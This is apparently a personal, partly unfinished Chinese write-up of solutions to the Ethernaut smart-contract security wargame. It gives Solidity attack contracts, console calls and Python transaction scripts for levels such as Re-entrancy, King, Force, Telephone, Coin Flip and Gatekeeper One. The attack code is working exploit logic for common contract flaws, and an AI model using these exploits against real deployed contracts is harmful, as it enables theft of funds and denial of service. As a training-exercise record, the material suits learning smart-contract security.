---
tags:
  - TODO
---

# Ethernaut 刷题记录

## Fallback


```js
await contract.contribute.sendTransaction({from: player, value: toWei('0.0009')})
await contract.sendTransaction({from: player, value: toWei('0.0001')})
await contract.withdraw()
```

receive 函数能够在合约账户接收以太币的时候触发 fallback，所以只要向合约发出带有以太币的交易就可以触发这个函数转移 owner

## Fallout

```js
await contract.Fal1out()
```

拼写错误

## Coin Flip

```js
contract Hack {
    CoinFlip coin_flip = CoinFlip(0x23B4f570431e0A701d5E08B80b3ecb7F53E75204);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor() {
    }

    function poc() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return coin_flip.flip(side);
    }
}
```

```python
def main():
    # contractAddress = deploy()
    contractAddress = "0x62ce547f26708dd8D311C14ac345664bAf7524F0"

    for i in range(10):
        print(f"Sending {i + 1}")
        txn_receipt = transact(hacker, contractAddress, utils.calc_call_data("poc()"))
        print(txn_receipt)
        time.sleep(3)
```

## Telephone

- tx.origin：交易发送方
- msg.sender：消息发送方

比如 用户账户 A -> 合约账户 B -> 合约账户 C，那么 C 获取到的 tx.origin 为 A，msg.sender 为 B。所以写个合约调用就行。

```js
contract Hack {
    Telephone tel;
    constructor (address t) {
        tel = Telephone(t);
    }

    function hack() public {
        tel.changeOwner(msg.sender);
    }
}
```
## Token

整型下溢就行

## Delegation

https://www.wtf.academy/solidity-advanced/Delegatecall/

当用户 A 通过合约 B 来 delegatecall 合约 C 的时候，执行的是合约 C 的函数，但是语境仍是合约 B 的：msg.sender 是 A 的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约 B 的变量上。

```py
contractAddress = "0xeb219f0c57D1C3e0a773c410C6284860B1959d78"
txn_receipt = transact(hacker, contractAddress, utils.calc_call_data("pwn()"))
```

## Force

`selfdestruct` 强制转账。

```js
contract Hack {
  constructor () payable {
  }

  function poc(address game) public payable {
      selfdestruct(payable(game));
  }
}
```

## Vault

存储的所有状态变量都是上链的

```js
await web3.eth.getStorageAt(instance, 1)
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

## King

可以看到题目合约在 receive 时会向前一个 king transfer，所以自己恶意合约的 receive 函数 revert 就行。

```js
contract Hack {
  King king;
  constructor(address game) payable {
    king = King(payable(game));
    payable(address(game)).call{value: msg.value}("");
  }

  receive() external payable {
    revert();
  }
}
```

## Re-entrancy

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

重入攻击，可以发现 `withdraw` 中直接调用的 `msg.sender.call{value:_amount}("")` 并且是先转账再改变状态，所以可以在转账的时候再次调用 `withdraw` 达到重入的效果。

```js
contract Hack {
    
    Reentrance r;
    uint cnt;

    constructor(address payable ch) public payable {
        r = Reentrance(ch);
        cnt = 1;
    }

    function step1() public payable {
        r.donate{value: 0.001 ether}(address(this));
    }

    function step2() public payable {
        r.withdraw(0.001 ether);
    }
    
    receive() external payable {
        if (cnt == 1) {
            r.withdraw(0.001 ether);
            cnt += 1;
        }
    }
}
```

## Elevator

意思挺简单的，就是让一个函数第一次返回 false 第二次返回 true:
```js
if (! building.isLastFloor(_floor)) {
  floor = _floor;
  top = building.isLastFloor(floor);
}
```

hack 合约

```js
contract Hack {
    
    Elevator e;
    bool top;

    constructor(address addr) {
        e = Elevator(addr);
        top = true;
    }

    function hack() public {
        e.goTo(100);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        top = !top;
        return top;
    }
}
```

## Privacy

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

这里考了 solidity storage 的布局以及 arg encoding。具体内容可以参考 [ctf-wiki](https://ctf-wiki.org/blockchain/ethereum/storage/) 进行学习。

可以知道 key 在 `slot[5]` 并且对于 byte32 取 byte16 即相当于取它的前 16 个字节。

![](https://cdn.silente.top/img/202307082032197.png)

## Gatekeeper One

有三个限制，一个一个来看。

首先是 `gateOne`：

```js
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```
直接用合约调用就行。

```js
modifier gateTwo() {
  require(gasleft() % 8191 == 0);
  _;
}
```

这里涉及到 solidity gas fee 的计算，它是跟 opcode 绑定的，当然这里我们可以直接在 remix 里断点调试拿到 gasleft 那时候的值，然后自己再修改 gas：

![](https://cdn.silente.top/img/202307082200814.png)

可以看到通过调试跟进，修改 gas 后栈上的两个值相同，都是 0x1fff。

```js
modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
  _;
}
```

第三个好绕，读懂发现需要满足：

- gateKey 的 33-48 位为 0
- gateKey 的前 32 位不全为 0
- gateKey 的后 16 位等于 tx.origin 的后 16 位

然后就能走进 enter 函数：

![](https://cdn.silente.top/img/202307082313589.png)

不过不知道什么问题一直在 `entrant = tx.origin;` 这里 revert emmm


## TODO